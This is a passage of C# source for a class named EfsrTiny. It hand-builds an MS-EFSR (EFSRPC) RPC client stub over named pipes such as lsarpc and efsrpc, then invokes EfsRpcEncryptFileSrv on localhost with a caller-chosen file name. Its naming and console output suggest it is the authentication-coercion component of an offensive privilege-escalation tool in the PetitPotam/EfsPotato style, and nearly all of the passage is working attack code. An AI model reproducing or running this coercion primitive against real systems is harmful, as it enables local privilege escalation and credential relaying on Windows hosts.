        private static byte[] MIDL_ProcFormatStringx64 = new byte[] { 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x18, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x02, 0x0a, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00 };

        private static byte[] MIDL_TypeFormatStringx86 = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x00, 0x00 };

        private static byte[] MIDL_TypeFormatStringx64 = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x00, 0x00 };
        Guid interfaceId;
        public EfsrTiny(string pipe)
        {
            IDictionary<string, string> bindingMapping = new Dictionary<string, string>()
            {
                {"lsarpc", "c681d488-d850-11d0-8c52-00c04fd90f7e"},
                {"efsrpc", "df1941c5-fe89-4e79-bf10-463657acf44d"},
                {"samr", "c681d488-d850-11d0-8c52-00c04fd90f7e"},
                {"lsass", "c681d488-d850-11d0-8c52-00c04fd90f7e"},
                {"netlogon", "c681d488-d850-11d0-8c52-00c04fd90f7e"}
            };

            interfaceId = new Guid(bindingMapping[pipe]);

            pipe = String.Format("\\pipe\\{0}", pipe);
            Console.WriteLine("[+] Pipe: " + pipe);
            if (IntPtr.Size == 8)
            {
                InitializeStub(interfaceId, MIDL_ProcFormatStringx64, MIDL_TypeFormatStringx64, pipe, 1, 0);
            }
            else
            {
                InitializeStub(interfaceId, MIDL_ProcFormatStringx86, MIDL_TypeFormatStringx86, pipe, 1, 0);
            }
        }

        ~EfsrTiny()
        {
            freeStub();
        }
        public int EfsRpcEncryptFileSrv(string FileName)
        {
            IntPtr result = IntPtr.Zero;
            IntPtr pfn = Marshal.StringToHGlobalUni(FileName);

            try
            {
                if (IntPtr.Size == 8)
                {
                    result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(2), Bind(Marshal.StringToHGlobalUni("localhost")), FileName);
                }
                else
                {
                    result = CallNdrClientCall2x86(2, Bind(Marshal.StringToHGlobalUni("localhost")), pfn);
                }
            }
            catch (SEHException)
            {
                int err = Marshal.GetExceptionCode();
                Console.WriteLine("[-] EfsRpcEncryptFileSrv failed: " + err);
                return err;
            }
            finally
            {
                if (pfn != IntPtr.Zero)
                    Marshal.FreeHGlobal(pfn);
            }
            return (int)result.ToInt64();
        }
        private byte[] MIDL_ProcFormatString;
        private byte[] MIDL_TypeFormatString;
        private GCHandle procString;
        private GCHandle formatString;
        private GCHandle stub;
        private GCHandle faultoffsets;
        private GCHandle clientinterface;
        private string PipeName;

        allocmemory AllocateMemoryDelegate = AllocateMemory;
        freememory FreeMemoryDelegate = FreeMemory;

        public UInt32 RPCTimeOut = 5000;

        protected void InitializeStub(Guid interfaceID, byte[] MIDL_ProcFormatString, byte[] MIDL_TypeFormatString, string pipe, ushort MajorVerson, ushort MinorVersion)
        {
            this.MIDL_ProcFormatString = MIDL_ProcFormatString;
            this.MIDL_TypeFormatString = MIDL_TypeFormatString;
            PipeName = pipe;
            procString = GCHandle.Alloc(this.MIDL_ProcFormatString, GCHandleType.Pinned);

            RPC_CLIENT_INTERFACE clientinterfaceObject = new RPC_CLIENT_INTERFACE(interfaceID, MajorVerson, MinorVersion);

            COMM_FAULT_OFFSETS commFaultOffset = new COMM_FAULT_OFFSETS();
            commFaultOffset.CommOffset = -1;
            commFaultOffset.FaultOffset = -1;
            faultoffsets = GCHandle.Alloc(commFaultOffset, GCHandleType.Pinned);
            clientinterface = GCHandle.Alloc(clientinterfaceObject, GCHandleType.Pinned);
            formatString = GCHandle.Alloc(MIDL_TypeFormatString, GCHandleType.Pinned);

            MIDL_STUB_DESC stubObject = new MIDL_STUB_DESC(formatString.AddrOfPinnedObject(),
                                                            clientinterface.AddrOfPinnedObject(),
                                                            Marshal.GetFunctionPointerForDelegate(AllocateMemoryDelegate),
                                                            Marshal.GetFunctionPointerForDelegate(FreeMemoryDelegate));

            stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
        }


        protected void freeStub()
        {
            procString.Free();
            faultoffsets.Free();
            clientinterface.Free();
            formatString.Free();
            stub.Free();
        }

        delegate IntPtr allocmemory(int size);

        protected static IntPtr AllocateMemory(int size)
        {
            IntPtr memory = Marshal.AllocHGlobal(size);
            return memory;
        }

        delegate void freememory(IntPtr memory);

        protected static void FreeMemory(IntPtr memory)
        {
            Marshal.FreeHGlobal(memory);
        }

        protected IntPtr Bind(IntPtr IntPtrserver)
        {
            string server = Marshal.PtrToStringUni(IntPtrserver);
            IntPtr bindingstring = IntPtr.Zero;
            IntPtr binding = IntPtr.Zero;
            Int32 status;
            status = RpcStringBindingCompose(interfaceId.ToString(), "ncacn_np", server, PipeName, null, out bindingstring);
            if (status != 0)
            {
                Console.WriteLine("[-] RpcStringBindingCompose failed with status 0x" + status.ToString("x"));
                return IntPtr.Zero;
            }
            status = RpcBindingFromStringBinding(Marshal.PtrToStringUni(bindingstring), out binding);
            RpcBindingFree(ref bindingstring);
            if (status != 0)
            {
                Console.WriteLine("[-] RpcBindingFromStringBinding failed with status 0x" + status.ToString("x"));
                return IntPtr.Zero;
            }

            status = RpcBindingSetAuthInfo(binding, server, /* RPC_C_AUTHN_LEVEL_PKT_PRIVACY */ 6, /* RPC_C_AUTHN_GSS_NEGOTIATE */ 9, IntPtr.Zero, AuthzSvc: 16);
            if (status != 0)
            {
                Console.WriteLine("[-] RpcBindingSetAuthInfo failed with status 0x" + status.ToString("x"));
            }

            status = RpcBindingSetOption(binding, 12, new IntPtr(RPCTimeOut));
            if (status != 0)
            {
                Console.WriteLine("[-] RpcBindingSetOption failed with status 0x" + status.ToString("x"));
            }
            Console.WriteLine("[+] binding ok (handle=" + binding.ToString("x") + ")");
            return binding;
        }

        protected IntPtr GetProcStringHandle(int offset)
        {
            return Marshal.UnsafeAddrOfPinnedArrayElement(MIDL_ProcFormatString, offset);
        }

        protected IntPtr GetStubHandle()
        {
            return stub.AddrOfPinnedObject();
        }
        protected IntPtr CallNdrClientCall2x86(int offset, params IntPtr[] args)
        {

            GCHandle stackhandle = GCHandle.Alloc(args, GCHandleType.Pinned);
            IntPtr result;
            try
            {
                result = NdrClientCall2x86(GetStubHandle(), GetProcStringHandle(offset), stackhandle.AddrOfPinnedObject());
            }
            finally
            {
                stackhandle.Free();
            }
            return result;
        }
    }
    [StructLayout(LayoutKind.Sequential)]
    struct COMM_FAULT_OFFSETS
    {
        public short CommOffset;
        public short FaultOffset;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_VERSION
    {
        public ushort MajorVersion;
        public ushort MinorVersion;
        public RPC_VERSION(ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
        {
            MajorVersion = InterfaceVersionMajor;
            MinorVersion = InterfaceVersionMinor;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_SYNTAX_IDENTIFIER
    {
        public Guid SyntaxGUID;
        public RPC_VERSION SyntaxVersion;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_CLIENT_INTERFACE
    {
        public uint Length;
        public RPC_SYNTAX_IDENTIFIER InterfaceId;
        public RPC_SYNTAX_IDENTIFIER TransferSyntax;
        public IntPtr /*PRPC_DISPATCH_TABLE*/ DispatchTable;
        public uint RpcProtseqEndpointCount;
        public IntPtr /*PRPC_PROTSEQ_ENDPOINT*/ RpcProtseqEndpoint;
        public IntPtr Reserved;
        public IntPtr InterpreterInfo;
        public uint Flags;

        public static Guid IID_SYNTAX = new Guid(0x8A885D04u, 0x1CEB, 0x11C9, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60);

        public RPC_CLIENT_INTERFACE(Guid iid, ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
        {
            Length = (uint)Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE));
            RPC_VERSION rpcVersion = new RPC_VERSION(InterfaceVersionMajor, InterfaceVersionMinor);
            InterfaceId = new RPC_SYNTAX_IDENTIFIER();
            InterfaceId.SyntaxGUID = iid;
            InterfaceId.SyntaxVersion = rpcVersion;
            rpcVersion = new RPC_VERSION(2, 0);
            TransferSyntax = new RPC_SYNTAX_IDENTIFIER();
            TransferSyntax.SyntaxGUID = IID_SYNTAX;
            TransferSyntax.SyntaxVersion = rpcVersion;
            DispatchTable = IntPtr.Zero;
            RpcProtseqEndpointCount = 0u;
            RpcProtseqEndpoint = IntPtr.Zero;
            Reserved = IntPtr.Zero;
            InterpreterInfo = IntPtr.Zero;
            Flags = 0u;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    struct MIDL_STUB_DESC
    {
        public IntPtr /*RPC_CLIENT_INTERFACE*/ RpcInterfaceInformation;
        public IntPtr pfnAllocate;
        public IntPtr pfnFree;
        public IntPtr pAutoBindHandle;
        public IntPtr /*NDR_RUNDOWN*/ apfnNdrRundownRoutines;
        public IntPtr /*GENERIC_BINDING_ROUTINE_PAIR*/ aGenericBindingRoutinePairs;
        public IntPtr /*EXPR_EVAL*/ apfnExprEval;
        public IntPtr /*XMIT_ROUTINE_QUINTUPLE*/ aXmitQuintuple;
        public IntPtr pFormatTypes;
        public int fCheckBounds;
        /* Ndr library version. */
        public uint Version;
        public IntPtr /*MALLOC_FREE_STRUCT*/ pMallocFreeStruct;
        public int MIDLVersion;
        public IntPtr CommFaultOffsets;
        // New fields for version 3.0+
        public IntPtr /*USER_MARSHAL_ROUTINE_QUADRUPLE*/ aUserMarshalQuadruple;
        // Notify routines - added for NT5, MIDL 5.0
        public IntPtr /*NDR_NOTIFY_ROUTINE*/ NotifyRoutineTable;
        public IntPtr mFlags;
        // International support routines - added for 64bit post NT5
        public IntPtr /*NDR_CS_ROUTINES*/ CsRoutineTables;
        public IntPtr ProxyServerInfo;
        public IntPtr /*NDR_EXPR_DESC*/ pExprInfo;
        // Fields up to now present in win2000 release.

        public MIDL_STUB_DESC(IntPtr pFormatTypesPtr, IntPtr RpcInterfaceInformationPtr,
                                IntPtr pfnAllocatePtr, IntPtr pfnFreePtr)
        {
            pFormatTypes = pFormatTypesPtr;
            RpcInterfaceInformation = RpcInterfaceInformationPtr;
            CommFaultOffsets = IntPtr.Zero;
            pfnAllocate = pfnAllocatePtr;
            pfnFree = pfnFreePtr;
            pAutoBindHandle = IntPtr.Zero;
            apfnNdrRundownRoutines = IntPtr.Zero;
            aGenericBindingRoutinePairs = IntPtr.Zero;
            apfnExprEval = IntPtr.Zero;
            aXmitQuintuple = IntPtr.Zero;
            fCheckBounds = 1;
            Version = 0x50002u;
            pMallocFreeStruct = IntPtr.Zero;
            MIDLVersion = 0x801026e;
            aUserMarshalQuadruple = IntPtr.Zero;
            NotifyRoutineTable = IntPtr.Zero;
            mFlags = new IntPtr(0x00000001);
            CsRoutineTables = IntPtr.Zero;
            ProxyServerInfo = IntPtr.Zero;
            pExprInfo = IntPtr.Zero;
        }
    }
}

